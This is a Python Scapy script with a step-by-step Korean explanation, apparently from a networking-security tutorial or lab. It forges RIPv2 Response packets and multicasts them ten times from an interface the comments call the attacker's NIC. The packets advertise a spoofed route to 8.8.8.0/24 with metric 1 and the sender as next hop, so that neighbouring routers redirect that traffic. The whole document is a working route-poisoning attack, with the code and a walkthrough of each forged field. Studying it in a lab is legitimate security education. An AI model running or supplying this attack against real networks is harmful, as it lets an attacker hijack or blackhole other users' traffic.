from scapy.all import *
from scapy.layers.rip import RIP, RIPEntry

# 1. RIP 멀티캐스트 전송 대상 설정
rip_ip = IP(dst="224.0.0.9") 
rip_udp = UDP(sport=520, dport=520) 

# 2. RIP 헤더 생성 (cmd=2: Response)
rip_header = RIP(cmd=2, version=2)

# 3. 위조된 RIP 라우팅 정보 구성
rip_entry = RIPEntry(
    AF=2,                 # IPv4
    RouteTag=0,             
    addr="8.8.8.0",        
    mask="255.255.255.0",    
    nextHop="0.0.0.0",       
    metric=1         
)

# 4. RIP 패킷 조립
rip_packet = rip_ip / rip_udp / rip_header / rip_entry

# 5. RIP 패킷 전송 (iface는 공격자 NIC)
send(rip_packet, iface="eth0", count=10)
---------------------------------------------------
0. 모듈 임포트:
코드 상단에서 scapy 라이브러리의 모든 기능과 RIP, RIPEntry 클래스를 임포트하여 패킷 생성 및 조작에 필요한 도구들을 불러옵니다.

1. IP / UDP 헤더 구성
IP() 함수를 사용해 IP 헤더를 생성하고, 목적지 주소(dst)를 "224.0.0.9"로 설정합니다.
이 주소는 RIP v2의 멀티캐스트 전송에 사용되는 주소로, 네트워크 상의 모든 RIP 지원 라우터에게 메시지를 전달합니다.
UDP()를 사용하여 UDP 헤더를 생성하고, 출발지(sport)와 목적지(dport) 포트를 520으로 지정합니다.
RIP 프로토콜은 UDP 520 포트를 기본으로 사용하므로 올바른 포트 설정이 필요합니다.

2. RIP 헤더 생성
RIP() 함수를 이용하여 RIP 헤더를 생성하고, cmd 파라미터를 2로, version 파라미터를 2로 설정합니다.
cmd=2는 이 패킷이 응답(Response) 메시지임을 나타내며, version=2는 RIP 버전 2를 사용해서 메시지를 생성함을 의미합니다.

3. 위조된 RIP 라우팅 정보 구성
RIPEntry()를 사용해 가짜(RIP 위조) 라우팅 정보를 생성합니다.
AF=2는 해당 라우팅 정보가 IPv4와 관련 있음을, addr는 위조된 네트워크 주소 "8.8.8.0"을, mask는 서브넷 마스크 "255.255.255.0"을 지정합니다.
nextHop은 "0.0.0.0"으로 설정해 라우터 자신을 의미하게 하며, metric을 1로 설정해 최적의 경로인 것처럼 속입니다.

4. RIP 패킷 조립
생성된 IP, UDP, RIP 헤더, 그리고 RIPEntry를 "/" 연산자로 계층적으로 결합해 완전한 RIP 패킷을 만듭니다.
이 패킷은 IP -> UDP -> RIP -> RIPEntry 순서의 계층 구조를 따릅니다.

5. RIP 패킷 전송
send() 함수를 사용하여 조립한 패킷을 전송합니다.
iface 매개변수로 "eth0"를 지정하여 해당 네트워크 인터페이스를 통해 패킷을 전송하며, count=10으로 10번 반복 발송합니다.
